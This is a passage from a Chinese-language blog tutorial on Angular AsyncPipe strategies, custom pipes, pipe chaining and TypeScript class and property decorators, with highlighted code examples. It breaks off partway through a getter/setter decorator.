</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>我们使用 publishReplay 替换了 share 操作符。调用 publishReplay() 方法后将返回一个ConnectableObservable 对象，当你调用 connect() 方法的时候，将主动执行订阅操作。</p> <p>事实上，在大多数情况下，我们只需要从服务器获取数据并显示数据。如果只是这样的话，我们可以使用 Promise 来修复 AsyncPipe 发送多次 HTTP 请求的问题：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>person <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;https://jsonplaceholder.typicode.com/posts/1&quot;</span><span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="asyncpipe-执行流程"><a href="#asyncpipe-执行流程" class="header-anchor">#</a> AsyncPipe 执行流程</h3> <center><img src="/vuebloger/img/post/2002029148-58d0d1d678d43_fix732.png"></center> <p>接下来我们看一下 PromiseStrategy 与 ObservableStrategy 策略：</p> <ul><li>SubscriptionStrategy</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">interface</span> <span class="token class-name">SubscriptionStrategy</span> <span class="token punctuation">{</span>
  <span class="token function">createSubscription</span><span class="token punctuation">(</span>async<span class="token operator">:</span> any<span class="token punctuation">,</span> updateLatestValue<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token function">dispose</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token function">onDestroy</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ul><li>PromiseStrategy</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">class</span> <span class="token class-name">PromiseStrategy</span> <span class="token keyword">implements</span> <span class="token class-name">SubscriptionStrategy</span> <span class="token punctuation">{</span>
  <span class="token function">createSubscription</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">any</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> 
    <span class="token function-variable function">updateLatestValue</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">v<span class="token operator">:</span> <span class="token builtin">any</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">any</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">async</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>updateLatestValue<span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">throw</span> e<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">dispose</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">onDestroy</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>ObservableStrategy</li></ul> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">class</span> <span class="token class-name">ObservableStrategy</span> <span class="token keyword">implements</span> <span class="token class-name">SubscriptionStrategy</span> <span class="token punctuation">{</span>
  <span class="token function">createSubscription</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> updateLatestValue<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">any</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">async</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">{</span>next<span class="token operator">:</span> updateLatestValue<span class="token punctuation">,</span> 
       <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">e<span class="token operator">:</span> <span class="token builtin">any</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">throw</span> e<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">dispose</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> subscription<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token comment">// 取消订阅</span>
  <span class="token function">onDestroy</span><span class="token punctuation">(</span>subscription<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> subscription<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="ng1管道对比"><a href="#ng1管道对比" class="header-anchor">#</a> ng1管道对比</h3> <p><a href="https://blog.csdn.net/weixin_30505225/article/details/96361559?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&amp;dist_request_id=1328767.57718.16176025069010201&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control">ng1内置的九种过滤器</a></p> <ul><li>ng1中称为filter,ng2中称为pipe 功能类似</li> <li>ng1中的 limitTo被替换为 slicePipe</li> <li>ng2新增了 asyncPipe，decimalPipe等</li></ul> <img src="/vuebloger/img/post/Snipaste_2021-04-05_13-40-11.png"> <h3 id="管道参数"><a href="#管道参数" class="header-anchor">#</a> 管道参数</h3> <p>管道可以接收任意数量的参数，使用方式是在管道名称后面添加 : 和参数值。如 number: '1.4-4' ，若需要传递多个参数则参数之间用冒号隔开</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>  <span class="token operator">&lt;</span>p ngNonBindable<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> slice<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> slice<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> sem <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="自定义管道"><a href="#自定义管道" class="header-anchor">#</a> 自定义管道</h3> <p>自定义管道的步骤：</p> <ul><li>使用 @Pipe 装饰器定义 Pipe 的 metadata 信息，如 Pipe 的名称 - 即 name 属性</li> <li>实现 PipeTransform 接口中定义的 transform 方法</li></ul> <p>WelcomePipe 定义</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Pipe<span class="token punctuation">,</span> PipeTransform <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Pipe</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'welcome'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">WelcomePipe</span> <span class="token keyword">implements</span> <span class="token class-name">PipeTransform</span> <span class="token punctuation">{</span>
  <span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">)</span> <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Invalid pipe argument for WelcomePipe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token string">&quot;Welcome to &quot;</span> <span class="token operator">+</span> value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>WelcomePipe 使用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token operator">&lt;</span>p ngNonBindable<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> welcome <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> welcome <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> Welcome to semlinker <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>RepeatPipe 定义</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Pipe<span class="token punctuation">,</span> PipeTransform<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Pipe</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span> <span class="token string">'repeat'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">RepeatPipe</span> <span class="token keyword">implements</span> <span class="token class-name">PipeTransform</span> <span class="token punctuation">{</span>
	<span class="token function">transform</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">:</span> any<span class="token punctuation">,</span> times<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>times<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>RepeatPipe 使用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token operator">&lt;</span>p ngNonBindable<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'lo'</span> <span class="token operator">|</span> repeat<span class="token operator">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'lo'</span> <span class="token operator">|</span> repeat<span class="token operator">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> lololo <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="管道链"><a href="#管道链" class="header-anchor">#</a> 管道链</h3> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code> <span class="token operator">&lt;</span>p ngNonBindable<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> slice<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">3</span> <span class="token operator">|</span> uppercase <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
 <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> slice<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">3</span> <span class="token operator">|</span> uppercase <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> <span class="token constant">SEM</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="typescript"><a href="#typescript" class="header-anchor">#</a> Typescript</h2> <p>可以查看<a href="https://www.tslang.cn/" target="_blank" rel="noopener noreferrer">官方文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>，通俗易懂，注意去学习下ts高级技巧如keyof，Partial &amp; Pick，typeof，Exclude &amp; Omit，is，record等的使用，目前（2021年4月16日）我在项目中使用的是4.0.5。</p> <h2 id="装饰器"><a href="#装饰器" class="header-anchor">#</a> 装饰器</h2> <p>装饰器是什么</p> <ul><li>它是一个表达式</li> <li>该表达式被执行后，返回一个函数</li> <li>函数的入参分别为 targe、name 和 descriptor</li> <li>执行该函数后，可能返回 descriptor 对象，用于配置 target 对象</li></ul> <h3 id="常用内置装饰器"><a href="#常用内置装饰器" class="header-anchor">#</a> 常用内置装饰器</h3> <p>类装饰器</p> <ul><li>@Component、@NgModule、@Pipe、@Injectable</li></ul> <p>属性装饰器</p> <ul><li>@Input、@Output、@ContentChild、@ContentChildren、@ViewChild、@ViewChildren</li></ul> <p>方法装饰器</p> <ul><li>@HostListener</li></ul> <p>参数装饰器</p> <ul><li>@Inject、@Optional、@Self、@SkipSelf、@Host</li></ul> <p>详细见<a href="/vuebloger/technology/angular知识点总结.html#ioc-di">依赖注入</a>部分的内容,留点耐性看哦，因为整理得很细。</p> <h3 id="分类"><a href="#分类" class="header-anchor">#</a> 分类</h3> <ul><li>类装饰器 (Class decorators)</li> <li>属性装饰器 (Property decorators)</li> <li>方法装饰器 (Method decorators)</li> <li>参数装饰器 (Parameter decorators)</li></ul> <p>自定义装饰器的要点是传参，精髓时使用函数切换上下文。比如：</p> <p><img src="/vuebloger/img/post/Snipaste_2021-04-12_18-09-05.png" alt=""></p> <h3 id="类装饰器"><a href="#类装饰器" class="header-anchor">#</a> 类装饰器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>declare type ClassDecorator <span class="token operator">=</span> <span class="token operator">&lt;</span>TFunction <span class="token keyword">extends</span> <span class="token class-name">Function</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> TFunction</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> TFunction <span class="token operator">|</span> <span class="token keyword">void</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>它接收一个参数：</p> <ul><li><code>target: TFunction</code> - 被装饰的类</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Greeter</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Function</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  target<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">greet</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
@Greeter
<span class="token keyword">class</span> <span class="token class-name">Greeting</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 内部实现</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> myGreeting <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Greeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myGreeting<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// console output: 'Hello!';</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>可以在 TypeScript Playground 中运行查看结果。接下来自定义输出的问候语</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Greeter</span><span class="token punctuation">(</span><span class="token parameter">greeting<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Function</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    target<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">greet</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
@<span class="token function">Greeter</span><span class="token punctuation">(</span><span class="token string">'您好'</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Greeting</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 内部实现</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> myGreeting <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Greeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myGreeting<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// console output: '您好!';</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="属性装饰器"><a href="#属性装饰器" class="header-anchor">#</a> 属性装饰器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>declare type <span class="token function-variable function">PropertyDecorator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span>Object<span class="token punctuation">,</span> propertyKey<span class="token operator">:</span> string <span class="token operator">|</span> symbol</span> <span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>它接收两个参数：</p> <ul><li><code>target: Object</code> - 被装饰的类</li> <li><code>propertyKey:string | symbol</code> - 被装饰类的属性名</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">/*
集中私有属性添加，分化&amp;简化get/set
用法：@getSetChange&lt;boolean&gt;({
       initSet(val) {
         if (val) {
           this.initIntellectualAdaptationData();
         }
       },
       set(val) {
         const flag = val ? '1' : '0';
         this.courseMgService.isSmartUpdate(this.coursePacketId, flag).subscribe(res =&gt; {
           if (res.status === 201) {
             if (val) {
               this.initIntellectualAdaptationData();
             }
             SessionStorageUtil.putPacketInfoItem('isSmart', flag);
           }
         });
       }
     })
     intellectualAdaptation: boolean;
 */</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> getSetChange<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>getSetCall<span class="token operator">:</span> GetSetCallOption<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>target<span class="token operator">:</span> object<span class="token punctuation">,</span> key<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter"><span class="token keyword">void</span></span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> propertyValue <span class="token operator">=</span> getSetCall<span class="token punctuation">.</span>initValue<span class="token punctuation">;</span>
    <span class="token keyword">const</span> label <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token parameter">total</span> <span class="token operator">=&gt;</span> total <span class="token operator">+=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>label<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> getSetCall<span class="token punctuation">.</span>get <span class="token operator">?</span> getSetCall<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span> <span class="token operator">:</span> propertyValue<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> getSetCall<span class="token punctuation">.</span>get <span class="token operator">?</span> getSetCall<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> getSetCall<span class="token punctuation">.</span>initValue<span class="token punctuation">)</span> <span class="token operator">:</span> getSetCall<span class="token punctuation">.</span>initValue<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token keyword">set</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>label<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          getSetCall<span class="token punctuation">.</span>set<span class="token operator">?.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> newValue<span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">[</span>label<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>getSetCall<span class="token punctuation">.</span>initSet<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            getSetCall<span class="token punctuation">.</span><span class="token function">initSet</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> newValue<span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
